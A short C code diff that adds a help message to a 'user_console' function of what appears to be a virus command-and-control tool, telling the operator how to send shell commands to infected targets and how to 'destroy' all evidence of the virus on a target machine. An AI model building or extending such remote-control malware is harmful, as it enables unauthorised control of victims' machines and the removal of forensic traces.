@@ -38,6 +38,7 @@ int user_console(char * fifo_name, int pid){
 
     exit(1);
   }
+  printf("Type in the number of the virus you want to send the command to plus the command you want to send. For example \n\n0 ls\n\nYou also can type in one of two special commands:\n1) d childinfo  #Reprint the struct with child d's info\n2) d destroy    #Remove all evidence of the virus on child d's target machine\n\n\n");
   while(1){
     int shellid;
     char cmd[1024];
